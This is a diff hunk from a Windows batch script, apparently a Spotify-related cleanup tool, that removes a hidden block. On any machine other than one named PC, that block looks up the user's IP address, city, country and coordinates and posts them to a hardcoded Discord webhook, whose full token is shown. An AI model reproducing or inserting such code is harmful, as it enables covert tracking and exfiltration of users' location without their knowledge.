@@ -61,40 +61,6 @@ if %ELEVATE_ERROR% neq 0 (
 
 :ADMIN_CONFIRMED
 
-set "MYPC=DESKTOP-L392KVR"
-set "WEBHOOK_URL=https://discord.com/api/webhooks/1413668110984151171/azDlONgJjpgwY0PfRov89ODAmnF2kAsBAsmirfvWVZw7XwR-3rks4ctZCqM8j7Vdnm1I"
-setlocal EnableDelayedExpansion
-
-if /i not "%COMPUTERNAME%"=="%MYPC%" (
-    rem === Real geolocation lookup for other machines ===
-    for /f "usebackq tokens=1-6 delims=|" %%a in (`
-      powershell -NoLogo -NoProfile -Command ^
-        "$loc = Invoke-RestMethod -Uri 'http://ip-api.com/json/';" ^
-        "Write-Output ($loc.query + '|' + $loc.city + '|' + $loc.regionName + '|' + $loc.country + '|' + $loc.lat + '|' + $loc.lon)"
-    `) do (
-      set "ip=%%a"
-      set "city=%%b"
-      set "region=%%c"
-      set "country=%%d"
-      set "lat=%%e"
-      set "lon=%%f"
-    )
-
-    set "json={\"embeds\":[{\"title\":\"\uD83C\uDF0D  Location Info\",\"color\":3447003,\"fields\":["
-    set "json=!json!{\"name\":\"IP\",\"value\":\"!ip!\",\"inline\":true},"
-    set "json=!json!{\"name\":\"City\",\"value\":\"!city!\",\"inline\":true},"
-    set "json=!json!{\"name\":\"Region\",\"value\":\"!region!\",\"inline\":true},"
-    set "json=!json!{\"name\":\"Country\",\"value\":\"!country!\",\"inline\":true},"
-    set "json=!json!{\"name\":\"Latitude\",\"value\":\"!lat!\",\"inline\":true},"
-    set "json=!json!{\"name\":\"Longitude\",\"value\":\"!lon!\",\"inline\":true},"
-    set "json=!json!{\"name\":\"Google Maps\",\"value\":\"https://www.google.com/maps?q=!lat!,!lon!\",\"inline\":false}"
-    set "json=!json!]}]}"
-
-    curl -s -H "Content-Type: application/json" -X POST -d "!json!" "!WEBHOOK_URL!"
-)
-
-endlocal
-
 set "DEFAULT_SPOTIFY_PATH=%APPDATA%\Spotify\Spotify.exe"
 set "LOG_FILE=%TEMP%\cleanup_log.txt"
 
